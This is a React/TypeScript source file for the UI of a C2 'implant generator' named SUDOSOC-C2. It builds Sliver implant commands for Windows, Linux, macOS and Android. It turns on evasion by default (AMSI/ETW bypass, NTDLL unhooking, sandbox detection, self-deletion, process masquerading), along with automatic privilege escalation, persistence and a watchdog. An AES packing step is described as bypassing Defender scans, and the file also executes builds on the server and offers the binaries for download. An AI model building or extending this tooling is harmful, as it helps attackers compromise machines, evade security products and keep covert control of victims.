/**
 * SUDOSOC-C2 — Implant Generator
 * Professional payload builder inspired by Havoc/Mythic
 * Features: all platforms, all formats including APK, terminal execute
 */
import { useState, useEffect, useRef } from 'react'
import { Cpu, Copy, CheckCheck, Terminal as TermIcon, Zap, Shield,
         AlertCircle, CheckCircle2, Radio, Package, Play, Download,
         Loader, RefreshCw, ChevronDown, ChevronRight, X } from 'lucide-react'
import { apiFetch, apiPost, useAPI } from '../hooks/useAPI'
import type { Listener } from '../types'

// ─── Types ────────────────────────────────────────────────────────────────────

interface OptionItem  { value: string; label: string; description?: string }
interface EvasionOpt  { key: string; label: string; description: string; default: boolean }
interface GenOptions  {
  os: string; arch: string
  formats: OptionItem[]; protocols: OptionItem[]; evasion: EvasionOpt[]
  arches: string[]; default_ports: Record<string, number>
}
interface TermLine { text: string; type: 'cmd' | 'out' | 'ok' | 'err' | 'info' }

// ─── Platform config ──────────────────────────────────────────────────────────

const PLATFORMS = [
  { value: 'windows', label: 'Windows',  icon: '🪟', arches: ['amd64','386','arm64'], defaultFmt: 'exe' },
  { value: 'linux',   label: 'Linux',    icon: '🐧', arches: ['amd64','arm64','386','arm'], defaultFmt: 'elf' },
  { value: 'macos',   label: 'macOS',    icon: '🍎', arches: ['amd64','arm64'], defaultFmt: 'macho' },
  { value: 'android', label: 'Android',  icon: '🤖', arches: ['arm64','arm'], defaultFmt: 'apk' },
]

const FORMAT_MAP: Record<string, { icon: string; label: string; ext: string; desc: string }[]> = {
  windows: [
    { icon: '💻', label: 'EXE',       ext: 'exe',       desc: 'Windows executable' },
    { icon: '⚙️', label: 'DLL',       ext: 'dll',       desc: 'Shared library / DLL hijack' },
    { icon: '🔧', label: 'Service',   ext: 'exe',       desc: 'Windows service binary' },
    { icon: '💉', label: 'Shellcode', ext: 'bin',       desc: 'Raw shellcode (x64)' },
  ],
  linux: [
    { icon: '🐧', label: 'ELF',       ext: 'elf',       desc: 'Linux ELF binary' },
    { icon: '📦', label: '.so',       ext: 'so',        desc: 'Shared object / LD_PRELOAD' },
    { icon: '⚡', label: 'Script',    ext: 'sh',        desc: 'Shell dropper script' },
    { icon: '💉', label: 'Shellcode', ext: 'bin',       desc: 'Raw shellcode (x64)' },
  ],
  macos: [
    { icon: '🍎', label: 'Mach-O',   ext: 'macho',     desc: 'macOS native binary' },
    { icon: '📦', label: 'dylib',    ext: 'dylib',     desc: 'Dynamic library / hijack' },
    { icon: '⚡', label: 'Script',   ext: 'sh',        desc: 'Shell dropper' },
  ],
  android: [
    { icon: '📲', label: 'APK',      ext: 'apk',       desc: 'Android Package (sideload)' },
    { icon: '🔧', label: 'ELF ARM64',ext: 'elf',       desc: 'Native ARM64 binary (Termux)' },
    { icon: '⚡', label: 'Script',   ext: 'sh',        desc: 'ADB shell installer script' },
    { icon: '📦', label: '.so',      ext: 'so',        desc: 'Android shared library' },
  ],
}

const EVASION_OPTS = [
  { key: 'obfuscate',       label: 'Garble Obfuscation',       desc: 'Symbol + string obfuscation',         platform: 'all' },
  { key: 'sandbox_detect',  label: 'Sandbox Detection',        desc: 'Exit silently in sandboxes',          platform: 'all' },
  { key: 'amsi_bypass',     label: 'AMSI Bypass',              desc: 'Patch AmsiScanBuffer in-memory',      platform: 'windows' },
  { key: 'etw_bypass',      label: 'ETW Bypass',               desc: 'Silence Windows event tracing',       platform: 'windows' },
  { key: 'sleep_obfuscation', label: 'Sleep Obfuscation',      desc: 'Encrypt heap during sleep',          platform: 'windows' },
  { key: 'ntdll_unhook',    label: 'NTDLL Unhook',             desc: 'Load clean NTDLL copy',               platform: 'windows' },
  { key: 'stack_spoof',     label: 'Stack Spoofing',           desc: 'Fake return address stack',          platform: 'windows' },
  { key: 'indirect_syscall', label: 'Indirect Syscalls',       desc: 'SSN from live ntdll + gadget jump',  platform: 'windows' },
  { key: 'anti_debug',      label: 'Anti-Debug',               desc: 'TracerPid + timing checks',          platform: 'all' },
  { key: 'self_delete',     label: 'Self-Delete on Start',     desc: 'Remove binary from disk after load', platform: 'all' },
  { key: 'process_mask',    label: 'Process Masquerade',       desc: 'Fake process name in ps/tasklist',   platform: 'all' },
  { key: 'auto_escalate',   label: 'Auto Privilege Escalation', desc: '21 methods — root/SYSTEM before C2',platform: 'all' },
  { key: 'auto_persist',    label: 'Auto Persistence',         desc: '4+ mechanisms installed on startup', platform: 'all' },
  { key: 'watchdog',        label: 'Watchdog (auto-restart)',  desc: 'Respawn if killed, re-add persistence', platform: 'all' },
]

// ─── Component ────────────────────────────────────────────────────────────────

export default function Generate() {
  const [os,       setOS]       = useState('windows')
  const [arch,     setArch]     = useState('amd64')
  const [protocol, setProtocol] = useState('mtls')
  const [format,   setFormat]   = useState('exe')
  const [c2host,   setC2Host]   = useState('')
  const [c2port,   setC2Port]   = useState(31337)
  const [name,     setName]     = useState('')
  const [evasion,  setEvasion]  = useState<Record<string, boolean>>({
    obfuscate: true, sandbox_detect: true, anti_debug: true,
    self_delete: true, process_mask: true, auto_escalate: true,
    auto_persist: true, watchdog: true,
    amsi_bypass: true, etw_bypass: true, sleep_obfuscation: true,
    ntdll_unhook: true, stack_spoof: true, indirect_syscall: true,
  })
  const [domains,  setDomains]  = useState('')
  const [interval, setInterval] = useState(60)
  const [jitter,   setJitter]   = useState(15)
  const [beacon,   setBeacon]   = useState(false)

  const [opts,     setOpts]     = useState<GenOptions | null>(null)
  const [loading,  setLoading]  = useState(false)
  const [result,   setResult]   = useState<{ command: string; message: string; path?: string } | null>(null)
  const [error,    setError]    = useState<string | null>(null)
  const [copied,   setCopied]   = useState(false)
  const [terminal, setTerminal] = useState<TermLine[]>([])
  const [running,  setRunning]  = useState(false)
  const [packing,  setPacking]  = useState(false)
  const [showEvasion, setShowEvasion] = useState(true)
  const termRef = useRef<HTMLDivElement>(null)

  const { data: listeners } = useAPI<Listener[]>('/api/listeners', 5_000)

  const plat = PLATFORMS.find(p => p.value === os) ?? PLATFORMS[0]
  const formats = FORMAT_MAP[os] ?? FORMAT_MAP.linux

  useEffect(() => {
    // Set defaults when OS changes
    setArch(plat.arches[0])
    setFormat(plat.defaultFmt)
    if (os === 'android') { setBeacon(false) }
    setResult(null); setError(null)
    loadOpts()
  }, [os])

  useEffect(() => {
    if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight
  }, [terminal])

  async function loadOpts() {
    try {
      const o = await apiFetch<GenOptions>(`/api/generate/options?os=${os}&arch=${arch}`)
      setOpts(o)
      const firstProto = o.protocols[0]?.value ?? 'mtls'
      setProtocol(firstProto)
      setC2Port(o.default_ports[firstProto] ?? 31337)
    } catch {}
  }

  function pickListener(l: Listener) {
    const proto = l.protocol?.toLowerCase() ?? 'mtls'
    setProtocol(proto)
    setC2Port(l.port)
    if (proto === 'dns' && l.domains && l.domains.length > 0) setDomains(l.domains.join(', '))
  }

  function toggleEvasion(key: string) {
    setEvasion(prev => ({ ...prev, [key]: !prev[key] }))
  }

  function buildCommand(): string {
    // Map OS → GOOS
    const goos = os === 'macos' ? 'darwin' : os

    // Map UI format names → Sliver CLI format values
    let genFormat = format
    switch (format) {
      case 'apk': case 'elf': case 'macho': case 'sh': case 'script': genFormat = 'exe';      break
      case 'dll': case 'so':  case 'dylib':                            genFormat = 'shared';   break
      case 'bin':                                                       genFormat = 'shellcode'; break
    }

    // Base subcommand
    let cmd = beacon ? 'generate beacon' : 'generate'

    // C2 connection (DNS uses domain names, not host:port)
    if (protocol === 'dns' && domains.trim()) {
      cmd += ` --dns ${domains.trim()}`
    } else {
      cmd += ` --${protocol} ${c2host}:${c2port}`
    }

    cmd += ` --os ${goos} --arch ${arch}`
    if (genFormat !== 'exe') cmd += ` --format ${genFormat}`
    if (name) cmd += ` --name ${name}`

    // Valid evasion CLI flags
    if (evasion.ntdll_unhook || evasion.stack_spoof || evasion.indirect_syscall) cmd += ' --evasion'
    if (evasion.sleep_obfuscation)            cmd += ' --sleep-obfuscation'
    if (evasion.sandbox_detect)               cmd += ' --sandbox-detection'
    if (evasion.amsi_bypass || evasion.api_hashing) cmd += ' --api-hashing'
    // (AMSI patch, ETW, auto-escalate, auto-persist, watchdog, anti-debug,
    //  self-delete are compile-time always-on via hardenx_*.go — no CLI flag needed)

    // Beacon interval (--seconds + --jitter, both in seconds)
    if (beacon) {
      cmd += ` --seconds ${interval}`
      if (jitter > 0) cmd += ` --jitter ${jitter}`
    }

    cmd += ' --save /tmp/'
    return cmd
  }

  async function generate() {
    if (!c2host.trim()) { setError('C2 host/IP is required'); return }
    setLoading(true); setError(null); setResult(null)
    setTerminal([
      { text: `$ ${buildCommand()}`, type: 'cmd' },
      { text: `[*] Building ${plat.label} implant for ${arch}...`, type: 'info' },
    ])
    try {
      const res = await apiPost<{ command: string; message: string; path?: string }>('/api/generate', {
        os, arch, protocol, c2host: c2host.trim(), c2port, format,
        name: name.trim() || undefined,
        is_beacon: beacon, beacon_interval: interval * 1000, beacon_jitter: jitter,
        evasion,
        domains: domains.split(',').map(d => d.trim()).filter(Boolean),
      })
      setResult(res)
      setTerminal(prev => [
        ...prev,
        { text: `[*] Applying evasion: ${Object.entries(evasion).filter(([,v])=>v).map(([k])=>k).join(', ')}`, type: 'info' },
        { text: `[+] ${res.message}`, type: 'ok' },
        res.path ? { text: `[+] Saved: ${res.path}`, type: 'ok' } : { text: '', type: 'info' },
      ])
    } catch (e) {
      const msg = String(e).replace('Error: ', '')
      setError(msg)
      setTerminal(prev => [...prev, { text: `[-] Error: ${msg}`, type: 'err' }])
    } finally { setLoading(false) }
  }

  async function executeInTerminal() {
    if (!result) return
    setRunning(true)
    setTerminal(prev => [
      ...prev,
      { text: '', type: 'info' },
      { text: `$ ${result.command}`, type: 'cmd' },
      { text: '[*] Executing generate command on server...', type: 'info' },
    ])
    try {
      const res = await apiPost<{ output: string; path?: string }>('/api/generate/exec', {
        command: result.command
      })
      const lines = (res.output || '').split('\n').filter(Boolean)
      setTerminal(prev => [
        ...prev,
        ...lines.map(l => ({
          text: l,
          type: (l.includes('[+]') || l.includes('✓') || l.includes('saved')) ? 'ok' :
                l.includes('[-]') || l.includes('error') ? 'err' : 'out'
        } as TermLine)),
        ...(res.path ? [{ text: `[+] Binary ready: ${res.path}`, type: 'ok' as const }] : []),
      ])
    } catch (e) {
      setTerminal(prev => [...prev, { text: `[-] Exec failed: ${e}`, type: 'err' }])
    } finally { setRunning(false) }
  }

  function downloadImplant() {
    if (!result?.path) return
    window.open(`/api/generate/download?path=${encodeURIComponent(result.path)}`, '_blank')
  }

  // Pack: AES-256-GCM encrypt the generated binary inside a fresh Go loader.
  // The packed loader has zero C2 signatures — Defender sees only ciphertext.
  async function packImplant() {
    if (!result?.path) return
    setPacking(true)
    setTerminal(prev => [
      ...prev,
      { text: '', type: 'info' },
      { text: '[*] Packing with AES-256-GCM loader…', type: 'info' },
      { text: '[*] Compiling loader with garble (-literals -tiny -seed=random)…', type: 'info' },
    ])
    try {
      const res = await apiPost<{ path: string; message: string }>('/api/generate/pack', {
        binary_path:  result.path,
        implant_name: name.trim() || 'implant',
        is_shellcode: format === 'bin',
      })
      setResult(prev => prev ? { ...prev, path: res.path, message: res.message } : null)
      setTerminal(prev => [
        ...prev,
        { text: `[+] Packed loader: ${res.path}`, type: 'ok' },
        { text: `[*] ${res.message}`, type: 'info' },
        { text: '[+] Ready to download — click ↓', type: 'ok' },
      ])
    } catch (e) {
      setTerminal(prev => [...prev, { text: `[-] Pack failed: ${e}`, type: 'err' }])
    } finally { setPacking(false) }
  }

  const activeFmt = formats.find(f => f.ext === format) ?? formats[0]

  return (
    <div className="flex h-full gap-3 overflow-hidden">

      {/* ── Left: config ─────────────────────────────────────────── */}
      <div className="w-72 shrink-0 flex flex-col gap-3 overflow-y-auto">

        {/* Platform selector */}
        <div className="panel">
          <div className="section-hdr"><Cpu size={10} className="text-primary" /> Platform</div>
          <div className="grid grid-cols-4 gap-1 p-2">
            {PLATFORMS.map(p => (
              <button key={p.value} onClick={() => setOS(p.value)}
                className={`flex flex-col items-center gap-1 py-2 rounded-md border transition-all ${
                  os === p.value
                    ? 'border-primary bg-primary/10 text-primary'
                    : 'border-border text-muted hover:border-border/80 hover:text-accent'
                }`}>
                <span style={{ fontSize: 18 }}>{p.icon}</span>
                <span style={{ fontSize: 9, fontWeight: 700 }}>{p.label}</span>
              </button>
            ))}
          </div>
        </div>

        {/* Format */}
        <div className="panel">
          <div className="section-hdr">📦 Format</div>
          <div className="grid grid-cols-2 gap-1 p-2">
            {formats.map(f => (
              <button key={f.ext} onClick={() => setFormat(f.ext)}
                title={f.desc}
                className={`flex items-center gap-1.5 px-2.5 py-2 rounded border text-left transition-all ${
                  format === f.ext
                    ? 'border-primary bg-primary/10 text-primary'
                    : 'border-border text-muted hover:text-accent'
                }`} style={{ fontSize: 10 }}>
                <span>{f.icon}</span>
                <span className="font-bold">{f.label}</span>
              </button>
            ))}
          </div>
        </div>

        {/* Architecture */}
        <div className="panel">
          <div className="section-hdr">⚙️ Architecture</div>
          <div className="flex flex-wrap gap-1 p-2">
            {plat.arches.map(a => (
              <button key={a} onClick={() => setArch(a)}
                className={`btn btn-sm ${arch === a ? 'btn-primary' : 'btn-ghost'}`}
                style={{ fontSize: 9 }}>
                {a}
              </button>
            ))}
          </div>
        </div>

        {/* Protocol */}
        <div className="panel">
          <div className="section-hdr">📡 C2 Protocol</div>
          <div className="p-2 space-y-2">
            <div className="grid grid-cols-2 gap-1">
              {(opts?.protocols ?? [
                { value: 'mtls',  label: 'mTLS' },
                { value: 'https', label: 'HTTPS' },
                { value: 'http',  label: 'HTTP' },
                { value: 'dns',   label: 'DNS' },
              ]).map(p => (
                <button key={p.value} onClick={() => {
                  setProtocol(p.value)
                  if (opts?.default_ports?.[p.value]) setC2Port(opts.default_ports[p.value])
                }}
                  className={`btn btn-sm ${protocol === p.value ? 'btn-primary' : 'btn-ghost'}`}
                  style={{ fontSize: 9 }}>
                  {p.label}
                </button>
              ))}
            </div>
            <div className="flex gap-1.5">
              <input value={c2host} onChange={e => setC2Host(e.target.value)}
                placeholder="10.10.10.5"
                className="c2-input flex-1" />
              <input type="number" value={c2port} onChange={e => setC2Port(parseInt(e.target.value)||31337)}
                className="c2-input w-20" />
            </div>
            {protocol === 'dns' && (
              <input value={domains} onChange={e => setDomains(e.target.value)}
                placeholder="c2.domain.com, c2.evil.org"
                className="c2-input w-full" />
            )}
          </div>
        </div>

        {/* Beacon options */}
        <div className="panel">
          <div className="section-hdr">
            <Radio size={10} className="text-primary" /> Callback Mode
          </div>
          <div className="p-2 space-y-2">
            <div className="flex gap-1">
              <button onClick={() => setBeacon(false)}
                className={`btn btn-sm flex-1 ${!beacon ? 'btn-primary' : 'btn-ghost'}`} style={{ fontSize: 9 }}>
                Session (live)
              </button>
              <button onClick={() => setBeacon(true)}
                className={`btn btn-sm flex-1 ${beacon ? 'btn-primary' : 'btn-ghost'}`} style={{ fontSize: 9 }}>
                Beacon (async)
              </button>
            </div>
            {beacon && (
              <div className="flex gap-1.5 items-center" style={{ fontSize: 9, color: 'var(--muted)' }}>
                <span>Every</span>
                <input type="number" value={interval} onChange={e => setInterval(parseInt(e.target.value)||60)}
                  className="c2-input w-14" style={{ fontSize: 9 }} />
                <span>s ±</span>
                <input type="number" value={jitter} onChange={e => setJitter(parseInt(e.target.value)||15)}
                  className="c2-input w-14" style={{ fontSize: 9 }} />
                <span>%</span>
              </div>
            )}
          </div>
        </div>

        {/* Listener picker */}
        {(listeners ?? []).length > 0 && (
          <div className="panel">
            <div className="section-hdr"><Antenna size={10} className="text-primary" /> Use Active Listener</div>
            <div className="p-2 space-y-1">
              {(listeners ?? []).map(l => (
                <button key={l.id} onClick={() => pickListener(l)}
                  className="w-full flex items-center gap-2 px-2 py-1.5 rounded border border-border hover:border-primary/40 hover:bg-primary/5 transition-all text-left">
                  <span className="dot dot-live shrink-0" />
                  <span className="flex-1 text-accent" style={{ fontSize: 10 }}>{l.name}</span>
                  <span className="text-muted" style={{ fontSize: 9 }}>{l.protocol}:{l.port}</span>
                </button>
              ))}
            </div>
          </div>
        )}

        {/* Name */}
        <div className="panel">
          <div className="section-hdr">🏷️ Implant Name (optional)</div>
          <div className="p-2">
            <input value={name} onChange={e => setName(e.target.value)}
              placeholder="phantom_corp"
              className="c2-input w-full" />
          </div>
        </div>
      </div>

      {/* ── Center/Right: evasion + output ─────────────────────────── */}
      <div className="flex-1 flex flex-col gap-3 min-w-0 overflow-hidden">

        {/* Evasion options */}
        <div className="panel shrink-0">
          <button onClick={() => setShowEvasion(v => !v)}
            className="section-hdr w-full hover:bg-white/4 transition-colors" style={{ cursor: 'pointer' }}>
            <Shield size={10} className="text-primary" />
            Evasion & Hardening
            <span className="ml-2 text-primary text-[8px]">
              {Object.values(evasion).filter(Boolean).length} / {EVASION_OPTS.filter(o => o.platform === 'all' || o.platform === os).length} active
            </span>
            <span className="ml-auto text-muted">
              {showEvasion ? <ChevronDown size={11}/> : <ChevronRight size={11}/>}
            </span>
          </button>
          {showEvasion && (
            <div className="p-2 grid grid-cols-2 gap-1">
              {EVASION_OPTS
                .filter(opt => opt.platform === 'all' || opt.platform === os)
                .map(opt => (
                <button key={opt.key}
                  onClick={() => toggleEvasion(opt.key)}
                  title={opt.desc}
                  className={`flex items-center gap-2 px-2.5 py-1.5 rounded border text-left transition-all ${
                    evasion[opt.key]
                      ? 'border-primary/40 bg-primary/8 text-primary'
                      : 'border-border text-muted hover:border-border/80'
                  }`} style={{ fontSize: 9.5 }}>
                  <span className={`w-2 h-2 rounded-full shrink-0 ${evasion[opt.key] ? 'bg-primary' : 'bg-dim'}`} />
                  {opt.label}
                </button>
              ))}
            </div>
          )}
        </div>

        {/* Generate button */}
        <div className="shrink-0 flex items-center gap-2">
          <button onClick={generate} disabled={loading || !c2host.trim()}
            className="btn btn-primary flex-1"
            style={{ padding: '10px 20px', fontSize: 12, fontWeight: 700 }}>
            {loading
              ? <><Loader size={13} className="animate-spin" /> Building…</>
              : <><Zap size={13} /> Generate {plat.icon} {activeFmt.label}</>
            }
          </button>
          {result && (
            <>
              <button onClick={executeInTerminal} disabled={running}
                className="btn btn-primary" title="Execute generate command on server terminal">
                {running ? <Loader size={12} className="animate-spin" /> : <Play size={12} />}
                <span style={{ fontSize: 10 }}>Execute</span>
              </button>

              {/* Pack: AES-encrypt implant inside fresh loader binary */}
              {result.path && os === 'windows' && (
                <button onClick={packImplant} disabled={packing}
                  title="AES-256-GCM encrypt implant inside a fresh garbled loader — bypasses Defender static scan"
                  style={{
                    display: 'flex', alignItems: 'center', gap: 5,
                    padding: '6px 12px', borderRadius: 4, fontSize: 10,
                    fontFamily: 'inherit', fontWeight: 700, cursor: packing ? 'wait' : 'pointer',
                    background: packing ? 'rgba(185,28,28,.08)' : 'rgba(185,28,28,.15)',
                    border: '1px solid rgba(185,28,28,.5)',
                    color: '#ef4444',
                  }}>
                  {packing ? <Loader size={11} className="animate-spin" /> : <Shield size={11} />}
                  {packing ? 'Packing…' : 'Pack (AES)'}
                </button>
              )}

              <button onClick={() => { navigator.clipboard.writeText(buildCommand()); setCopied(true); setTimeout(()=>setCopied(false),1500) }}
                className="btn btn-ghost" title="Copy command">
                {copied ? <CheckCheck size={11} /> : <Copy size={11} />}
              </button>
              {result.path && (
                <button onClick={downloadImplant}
                  className="btn btn-ghost" title="Download binary">
                  <Download size={11} />
                </button>
              )}
            </>
          )}
        </div>

        {error && (
          <div className="shrink-0 flex items-center gap-2 px-3 py-2 rounded border border-danger/30 bg-danger/5"
            style={{ fontSize: 10, color: 'var(--danger)' }}>
            <AlertCircle size={12} /> {error}
          </div>
        )}

        {/* Terminal output */}
        <div className="flex-1 panel min-h-0 flex flex-col overflow-hidden">
          <div className="section-hdr">
            <TermIcon size={10} className="text-primary" />
            Build Output
            {terminal.length > 0 && (
              <button onClick={() => setTerminal([])}
                className="ml-auto text-muted hover:text-danger" style={{ fontSize: 9 }}>
                Clear
              </button>
            )}
          </div>
          <div ref={termRef} className="flex-1 overflow-y-auto p-3 font-mono space-y-0.5"
            style={{ background: '#040404', fontSize: 10.5 }}>
            {terminal.length === 0 ? (
              <div className="flex flex-col items-center justify-center h-full gap-3 text-center py-8">
                <TermIcon size={28} style={{ color: 'var(--dim)' }} />
                <div className="text-muted" style={{ fontSize: 11 }}>
                  Configure options → click Generate
                </div>
                <div className="text-muted" style={{ fontSize: 9 }}>
                  Output will appear here in real-time
                </div>
              </div>
            ) : terminal.map((line, i) => (
              <div key={i} className={
                line.type === 'cmd'  ? 'text-primary font-semibold' :
                line.type === 'ok'   ? 'text-primary' :
                line.type === 'err'  ? 'text-danger' :
                line.type === 'info' ? 'text-accent' :
                'text-text/80'
              }>
                {line.text}
              </div>
            ))}
            {(loading || running) && (
              <div className="text-muted flex items-center gap-1.5">
                <Loader size={10} className="animate-spin" />
                <span>{loading ? 'Compiling with garble…' : 'Executing on server…'}</span>
              </div>
            )}
          </div>
        </div>

        {/* Result summary */}
        {result && (
          <div className="shrink-0 panel p-3 space-y-2">
            <div className="flex items-center gap-2">
              <CheckCircle2 size={13} className="text-primary" />
              <span className="text-primary font-semibold" style={{ fontSize: 11 }}>
                {plat.icon} {plat.label} {activeFmt.label} generated
              </span>
            </div>
            <div className="bg-bg rounded border border-border p-2 font-mono"
              style={{ fontSize: 9.5, color: 'var(--accent)' }}>
              {buildCommand()}
            </div>
            {result.message && (
              <div className="text-muted" style={{ fontSize: 9.5 }}>{result.message}</div>
            )}
            <div className="flex gap-2 flex-wrap" style={{ fontSize: 9 }}>
              <span className="badge badge-session">OS: {os}/{arch}</span>
              <span className="badge badge-beacon">Format: {activeFmt.label}</span>
              <span className="badge badge-session">Protocol: {protocol}</span>
              <span className="badge badge-session">Mode: {beacon ? 'Beacon' : 'Session'}</span>
              {evasion.obfuscate    && <span className="badge badge-win">Garble ✓</span>}
              {evasion.auto_escalate && <span className="badge badge-win">AutoRoot ✓</span>}
              {evasion.amsi_bypass && os === 'windows' && <span className="badge badge-win">AMSI ✓</span>}
            </div>
          </div>
        )}
      </div>
    </div>
  )
}

// tiny import shim
function Antenna({ size, className }: { size: number; className?: string }) {
  return <svg xmlns="http://www.w3.org/2000/svg" width={size} height={size} viewBox="0 0 24 24"
    fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"
    className={className}>
    <path d="M2 12 L12 2 L22 12"/><path d="M12 2v20"/><path d="M5 19.5 L12 12 L19 19.5"/>
  </svg>
}
